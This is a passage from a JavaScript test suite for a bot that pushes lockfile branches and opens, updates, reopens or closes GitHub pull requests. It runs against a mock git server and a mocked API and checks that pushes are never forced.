		st.equal(server.tip(`refs/heads/${branch}`), git(['rev-parse', 'HEAD']).stdout.trim(), 'pushes the branch');
		st.deepEqual(writes(requests), [['POST /repos/o/r/pulls', {
			base, head: branch, title: 'the title', body: 'the body',
		}]], 'opens the PR');
		st.end();
	});

	t.test('update', async (st) => {
		const server = setup(st);
		const head = server.commit(branch, { [lockfile]: 'bot lock\n' }, { who: bot, from: 'main' });
		const requests = mockAPI(st, [['PATCH', /^\/repos\/o\/r\/pulls\/\d+$/, updated]]);
		const { git, dir } = clone(st, server);
		/** @type {PRState} */
		const state = { mode: 'update', number: 4, head };
		prepareBranch(git, {
			state, base, branch, remoteHasBranch: true, regenerated: isWorkflow,
		});
		botCommit(dir, 'the title', { [lockfile]: 'newer lock\n' });

		const outcome = await publish({
			...common, octokit: getOctokit('ghs_test'), git, state, remoteHasBranch: true,
		});

		st.equal(outcome, 'updated https://github.com/o/r/pull/4', 'reports the PR');
		st.equal(server.show(branch, lockfile), 'newer lock', 'pushes the branch');
		st.deepEqual(writes(requests), [['PATCH /repos/o/r/pulls/4', { title: 'the title', body: 'the body' }]], 'updates the PR');
		st.end();
	});

	t.test('reopen, with the remote branch', async (st) => {
		const server = setup(st);
		const head = server.commit(branch, { [lockfile]: 'bot lock\n' }, { who: bot, from: 'main' });
		const requests = mockAPI(st, [['PATCH', /^\/repos\/o\/r\/pulls\/\d+$/, updated]]);
		const { git, dir } = clone(st, server);
		/** @type {PRState} */
		const state = { mode: 'reopen', number: 5, head };
		prepareBranch(git, {
			state, base, branch, remoteHasBranch: true, regenerated: isWorkflow,
		});
		botCommit(dir, 'the title', { [lockfile]: 'newer lock\n' });

		const outcome = await publish({
			...common, octokit: getOctokit('ghs_test'), git, state, remoteHasBranch: true,
		});

		st.equal(outcome, 'reopened and updated https://github.com/o/r/pull/5', 'reports the PR');
		st.equal(server.show(branch, lockfile), 'newer lock', 'pushes the branch');
		st.deepEqual(writes(requests), [
			['PATCH /repos/o/r/pulls/5', { state: 'open' }],
			['PATCH /repos/o/r/pulls/5', { title: 'the title', body: 'the body' }],
		], 'reopens, then updates, the PR');
		st.end();
	});

	t.test('reopen, without the remote branch', async (st) => {
		const server = setup(st);
		const head = server.commit(branch, { [lockfile]: 'bot lock\n' }, { who: bot, from: 'main' });
		server.setRef('refs/pull/5/head', head);
		server.deleteRef(`refs/heads/${branch}`);
		/** @type {string[]} */
		const tipsAtReopen = [];
		const requests = mockAPI(st, [['PATCH', /^\/repos\/o\/r\/pulls\/\d+$/, (request) => {
			tipsAtReopen.push(server.tip(`refs/heads/${branch}`));
			return updated(request);
		}]]);
		const { git, dir } = clone(st, server);
		/** @type {PRState} */
		const state = { mode: 'reopen', number: 5, head };
		prepareBranch(git, {
			state, base, branch, remoteHasBranch: false, regenerated: isWorkflow,
		});
		botCommit(dir, 'the title', { [lockfile]: 'newer lock\n' });
		const final = git(['rev-parse', 'HEAD']).stdout.trim();

		const outcome = await publish({
			...common, octokit: getOctokit('ghs_test'), git, state, remoteHasBranch: false,
		});

		st.equal(outcome, 'reopened and updated https://github.com/o/r/pull/5', 'reports the PR');
		st.deepEqual(tipsAtReopen, [head, final], 'restores the branch at the PR’s head before reopening, then pushes the new commits');
		st.deepEqual(writes(requests), [
			['PATCH /repos/o/r/pulls/5', { state: 'open' }],
			['PATCH /repos/o/r/pulls/5', { title: 'the title', body: 'the body' }],
		], 'reopens, then updates, the PR');
		st.end();
	});

	t.test('the branch moved meanwhile: never forced', async (st) => {
		const server = setup(st);
		const head = server.commit(branch, { [lockfile]: 'bot lock\n' }, { who: bot, from: 'main' });
		const requests = mockAPI(st, [['PATCH', /^\/repos\/o\/r\/pulls\/\d+$/, updated]]);
		const { git, dir } = clone(st, server);
		/** @type {PRState} */
		const state = { mode: 'update', number: 4, head };
		prepareBranch(git, {
			state, base, branch, remoteHasBranch: true, regenerated: isWorkflow,
		});
		botCommit(dir, 'the title', { [lockfile]: 'newer lock\n' });
		const moved = server.commit(branch, { 'README.md': 'pushed meanwhile\n' }, { who: mallory });

		await publish({
			...common, octokit: getOctokit('ghs_test'), git, state, remoteHasBranch: true,
		}).then(
			() => st.fail('should reject'),
			(e) => st.match(e.message, /^`git push --quiet origin HEAD:refs\/heads\/fleet\/fix` failed/, 'rejects with the failed push'),
		);
		st.equal(server.tip(`refs/heads/${branch}`), moved, 'the other push survives');
		st.deepEqual(requests, [], 'touches no PR');
		st.end();
	});

	t.end();
});

test('closePR', (t) => {
	t.test('with a comment', async (st) => {
		const requests = mockAPI(st, [
			['POST', /^\/repos\/o\/r\/issues\/\d+\/comments$/, () => [201, {}]],
			['PATCH', /^\/repos\/o\/r\/pulls\/\d+$/, updated],
		]);

		await closePR({
			octokit: getOctokit('ghs_test'), owner, name, number: 4, comment: 'nothing left',
		});

		st.deepEqual(writes(requests), [
			['POST /repos/o/r/issues/4/comments', { body: 'nothing left' }],
			['PATCH /repos/o/r/pulls/4', { state: 'closed' }],
		], 'explains, then closes');
		st.end();
	});

	t.test('without a comment', async (st) => {
		const requests = mockAPI(st, [['PATCH', /^\/repos\/o\/r\/pulls\/\d+$/, updated]]);

		await closePR({
			octokit: getOctokit('ghs_test'), owner, name, number: 4,
		});

		st.deepEqual(writes(requests), [['PATCH /repos/o/r/pulls/4', { state: 'closed' }]], 'just closes');
		st.end();
	});

	t.end();
});
